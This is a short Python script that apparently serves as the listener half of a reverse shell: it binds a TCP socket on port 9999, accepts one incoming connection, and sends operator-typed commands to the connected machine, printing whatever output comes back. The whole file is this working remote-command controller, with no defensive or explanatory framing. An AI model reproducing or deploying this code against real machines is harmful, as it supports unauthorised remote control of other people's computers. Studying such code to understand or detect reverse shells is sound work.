import socket
import sys

bad_connection_limit = 5

#create socket
def socket_create():
	try:
		global host
		global port
		global soc
		host = ''
		port = 9999
		soc = socket.socket()
	except socket.error as msg:
		print("Socket creation error: " + str(msg))

# Bind socket to port and wait for connection from client
def socket_bind():
	try:
		global host
		global port
		global soc
		print("Bind socket to port: " + str(port))
		soc.bind((host,port))
		soc.listen(bad_connection_limit)
	except socket.error as msg:
		print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
		socket_bind()

# Establish a connetion with client (socket must be listening for them)
def socket_accept():
	conn, address = soc.accept()
	print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
	send_commands(conn)
	conn.close()

# Send commands
def send_commands(conn):
	while True:
		cmd = input()
		if cmd == 'quit':
			conn.close()
			soc.close()
			sys.exit()
		if len(str.encode(cmd)) > 0:
			conn.send(str.encode(cmd))
			client_response = str(conn.recv(1024), "ISO-8859-1")
			print(client_response,end="")

def main():
	socket_create()
	socket_bind()
	socket_accept()

main()